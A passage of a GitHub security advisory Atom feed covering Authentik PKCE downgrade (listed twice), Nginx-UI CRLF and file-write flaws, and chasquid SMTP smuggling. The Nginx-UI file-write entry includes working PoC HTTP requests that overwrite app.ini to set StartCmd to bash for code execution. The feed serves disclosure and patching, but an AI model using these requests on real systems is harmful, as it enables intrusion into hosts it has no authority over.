<li><a href="https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h">https://github.com/goreleaser/goreleaser/security/advisories/GHSA-h3q2-8whx-c29h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23840">https://nvd.nist.gov/vuln/detail/CVE-2024-23840</a></li>
<li><a href="https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0">https://github.com/goreleaser/goreleaser/commit/d5b6a533ca1dc3366983d5d31ee2d2b6232b83c0</a></li>
<li><a href="https://github.com/advisories/GHSA-h3q2-8whx-c29h">https://github.com/advisories/GHSA-h3q2-8whx-c29h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3q2-8whx-c29h</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-30T20:57:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] Authentik vulnerable to PKCE downgrade attack]]></title>
        <id>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</id>
        <link href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"/>
        <updated>2024-01-30T19:34:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>
<h2 id="patches">Patches</h2>
<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>
<h2 id="details">Details</h2>
<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>
<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>
<p>The OAuth BCP (<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23647">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>
<li><a href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[goauthentik.io] Authentik vulnerable to PKCE downgrade attack]]></title>
        <id>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</id>
        <link href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj"/>
        <updated>2024-01-30T19:34:59.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>PKCE is a very important countermeasure in OAuth2 , both for public and confidential clients. It protects against CSRF attacks and code injection attacks. Because of this bug, an attacker can circumvent the protection PKCE offers.</p>
<h2 id="patches">Patches</h2>
<p>authentik 2023.8.7 and 2023.10.7 fix this issue.</p>
<h2 id="details">Details</h2>
<p>There is a bug in our implementation of PKCE that allows an attacker to circumvent the protection that PKCE offers. PKCE adds the <code>code_challenge’ parameter to the authorization request and adds the </code>code_verifier’ parameter to the token request. We recently fixed a downgrade attack (in v2023.8.5 and 2023.10.4) where if the attacker removed the <code>code_verifier’ parameter in the token request, authentik would allow the request to pass, thus circumventing PKCE’s protection. However, in the latest version of the software, another downgrade scenario is still possible: if the attacker removes the </code>code_challenge’ parameter from the authorization request, authentik will also not do the PKCE check.</p>
<p>Note that this type of downgrade enables an attacker to perform a code injection attack, even if the OAuth client is using PKCE (which is supposed to protect against code injection attacks). To start the attack, the attacker must initiate the authorization process without that <code>code_challenge’ parameter in the authorization request. But this is easy to do (just use a phishing site or email to trick the user into clicking on a link that the attacker controls – the authorization link without that </code>code_challenge’ parameter).</p>
<p>The OAuth BCP (<a href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics">https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics</a>) explicitly mentions this particular attack in section 2.1.1: “Authorization servers MUST mitigate PKCE Downgrade Attacks by ensuring that a token request containing a code_verifier parameter is accepted only if a code_challenge parameter was present in the authorization request, see Section 4.8.2 for details.”</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@goauthentik.io">security@goauthentik.io</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/goauthentik/authentik/security/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
<li><a href="https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a">https://github.com/goauthentik/authentik/commit/38e04ae12720e5d81b4f7ac77997eb8d1275d31a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23647">https://nvd.nist.gov/vuln/detail/CVE-2024-23647</a></li>
<li><a href="https://github.com/advisories/GHSA-mrx3-gxjx-hjqj">https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrx3-gxjx-hjqj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-29T22:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to authenticated RCE through injecting into the application config via CRLF]]></title>
        <id>https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</id>
        <link href="https://github.com/advisories/GHSA-qcjq-7f7v-pvc8"/>
        <updated>2024-01-29T22:30:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Fix bypass to the following bugs</p>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-pxmr-q2x3-9x9m</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-8r25-68wm-jw35</a></li>
</ul>
<p>Allowing to inject directly in the <code>app.ini</code> via CRLF to change the value of <code>test_config_cmd</code> and <code>start_cmd</code> resulting in an Authenticated RCE</p>
<h3 id="impact">Impact</h3>
<p>Authenticated Remote execution on the host</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-qcjq-7f7v-pvc8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23828">https://nvd.nist.gov/vuln/detail/CVE-2024-23828</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1">https://github.com/0xJacky/nginx-ui/commit/d70e37c8575e25b3da7203ff06da5e16c77a42d1</a></li>
<li><a href="https://github.com/advisories/GHSA-qcjq-7f7v-pvc8">https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qcjq-7f7v-pvc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-29T22:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/0xJacky/Nginx-UI] Nginx-UI vulnerable to arbitrary file write through the Import Certificate feature]]></title>
        <id>https://github.com/advisories/GHSA-xvq9-4vpv-227m</id>
        <link href="https://github.com/advisories/GHSA-xvq9-4vpv-227m"/>
        <updated>2024-01-29T22:30:19.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Import Certificate feature allows arbitrary write into the system. The feature does not check if the provided user input is a certification/key and allows to write into arbitrary paths in the system.</p>
<p><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></p>
<pre><code>func AddCert(c *gin.Context) {
    var json struct {
        Name                  string `json:"name"`
        SSLCertificatePath    string `json:"ssl_certificate_path" binding:"required"`
        SSLCertificateKeyPath string `json:"ssl_certificate_key_path" binding:"required"`
        SSLCertificate        string `json:"ssl_certificate"`
        SSLCertificateKey     string `json:"ssl_certificate_key"`
        ChallengeMethod       string `json:"challenge_method"`
        DnsCredentialID       int    `json:"dns_credential_id"`
    }
    if !api.BindAndValid(c, &amp;json) {
        return
    }
    certModel := &amp;model.Cert{
        Name:                  json.Name,
        SSLCertificatePath:    json.SSLCertificatePath,
        SSLCertificateKeyPath: json.SSLCertificateKeyPath,
        ChallengeMethod:       json.ChallengeMethod,
        DnsCredentialID:       json.DnsCredentialID,
    }

    err := certModel.Insert()

    if err != nil {
        api.ErrHandler(c, err)
        return
    }

    content := &amp;cert.Content{
        SSLCertificatePath:    json.SSLCertificatePath,
        SSLCertificateKeyPath: json.SSLCertificateKeyPath,
        SSLCertificate:        json.SSLCertificate,
        SSLCertificateKey:     json.SSLCertificateKey,
    }

    err = content.WriteFile()

    if err != nil {
        api.ErrHandler(c, err)
        return
    }

    c.JSON(http.StatusOK, Transformer(certModel))
}
</code></pre>
<p><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></p>
<pre><code>func (c *Content) WriteFile() (err error) {
    // MkdirAll creates a directory named path, along with any necessary parents,
    // and returns nil, or else returns an error.
    // The permission bits perm (before umask) are used for all directories that MkdirAll creates.
    // If path is already a directory, MkdirAll does nothing and returns nil.

    err = os.MkdirAll(filepath.Dir(c.SSLCertificatePath), 0644)
    if err != nil {
        return
    }

    err = os.MkdirAll(filepath.Dir(c.SSLCertificateKeyPath), 0644)
    if err != nil {
        return
    }

    if c.SSLCertificate != "" {
        err = os.WriteFile(c.SSLCertificatePath, []byte(c.SSLCertificate), 0644)
        if err != nil {
            return
        }
    }

    if c.SSLCertificateKey != "" {
        err = os.WriteFile(c.SSLCertificateKeyPath, []byte(c.SSLCertificateKey), 0644)
        if err != nil {
            return
        }
    }

    return
}
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code>POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 144
Accept: application/json, text/plain, */*
Authorization: &lt;JWT&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/tmp/test","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"test","ssl_certificate_key":"test2"}
</code></pre>
<pre><code>root@aze:~/nginx# ls -la /tmp/test*
-rw-r--r-- 1 root root 4 Jan 24 13:33 /tmp/test
-rw-r--r-- 1 root root 5 Jan 24 13:33 /tmp/test2
</code></pre>
<p>It's possible to leverage it into an RCE in a senario by overwriting the config file app.ini - But it will require the app.</p>
<pre><code>root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = login
</code></pre>
<p>Then we overwrite the <code>StartCmd</code> with <code>bash</code></p>
<pre><code>POST /api/cert HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 980
Accept: application/json, text/plain, */*
Authorization: &lt;JWT&gt;
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Content-Type: application/json
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,fr;q=0.7
Connection: close

{"name":"poc","ssl_certificate_path":"/root/nginx/app.ini","ssl_certificate_key_path":"/tmp/test2","ssl_certificate":"[server]\r\nHttpHost          = 0.0.0.0\r\nHttpPort          = 9000\r\nRunMode           = debug\r\nJwtSecret         = 504f334b-ac68-4fbc-9160-2ecbf9e5794c\r\nNodeSecret        = 139ab224-9e9e-444f-987e-b3a651175ad5\r\nHTTPChallengePort = 9180\r\nEmail             = props@pros.com\r\nDatabase          = database\r\nStartCmd          = bash\r\nCADir             = dqsdqsd\r\nDemo              = false\r\nPageSize          = 10\r\nGithubProxy       = dqsdqfsdfsdfsdfsd\r\n\r\n[nginx]\r\nAccessLogPath =\r\nErrorLogPath  =\r\nConfigDir     =\r\nPIDPath       =\r\nTestConfigCmd =\r\nReloadCmd     =\r\nRestartCmd    =\r\n\r\n[openai]\r\nBaseUrl = \r\nToken   =\r\nProxy   =\r\nModel   = \r\n\r\n[casdoor]\r\nEndpoint     =\r\nClientId     =\r\nClientSecret =\r\nCertificate  =\r\nOrganization =\r\nApplication  =\r\nRedirectUri  =","ssl_certificate_key":"test2"}
</code></pre>
<pre><code>root@aze:~/nginx# cat app.ini  | grep "StartCmd"
StartCmd          = bash
</code></pre>
<p>For the new config to be applied the app needs to be restarted</p>
<p><img alt="image" src="https://user-images.githubusercontent.com/26652608/299331664-6415a8c1-6611-4e53-8137-3e574c58da28.png"></p>
<h3 id="impact">Impact</h3>
<p>Arbitrary write/overwrite into the host file system with a risk of remote code execution if the app restarts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m">https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-xvq9-4vpv-227m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23827">https://nvd.nist.gov/vuln/detail/CVE-2024-23827</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199">https://github.com/0xJacky/nginx-ui/commit/8581bdd3c6f49ab345b773517ba9173fa7fc6199</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/api/certificate/certificate.go#L72</a></li>
<li><a href="https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15">https://github.com/0xJacky/nginx-ui/blob/f20d97a9fdc2a83809498b35b6abc0239ec7fdda/internal/cert/write_file.go#L15</a></li>
<li><a href="https://github.com/advisories/GHSA-xvq9-4vpv-227m">https://github.com/advisories/GHSA-xvq9-4vpv-227m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xvq9-4vpv-227m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-29T22:30:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/albertito/chasquid] chasquid HTTP Request/Response Smuggling vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-g4x3-mfpj-f335</id>
        <link href="https://github.com/advisories/GHSA-g4x3-mfpj-f335"/>
        <updated>2024-01-29T22:29:09.000Z</updated>
        <content type="html"><![CDATA[<p>chasquid before 1.13 allows SMTP smuggling because LF-terminated lines are accepted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52354">https://nvd.nist.gov/vuln/detail/CVE-2023-52354</a></li>
<li><a href="https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24">https://blitiri.com.ar/p/chasquid/relnotes/#113-2023-12-24</a></li>
<li><a href="https://github.com/albertito/chasquid/issues/47">https://github.com/albertito/chasquid/issues/47</a></li>
<li><a href="https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74">https://github.com/albertito/chasquid/commit/a996106eeebe81a292ecba838c7503cac7493e74</a></li>
<li><a href="https://github.com/advisories/GHSA-g4x3-mfpj-f335">https://github.com/advisories/GHSA-g4x3-mfpj-f335</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4x3-mfpj-f335</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-22T06:30:32.000Z</published>
    </entry>
</feed>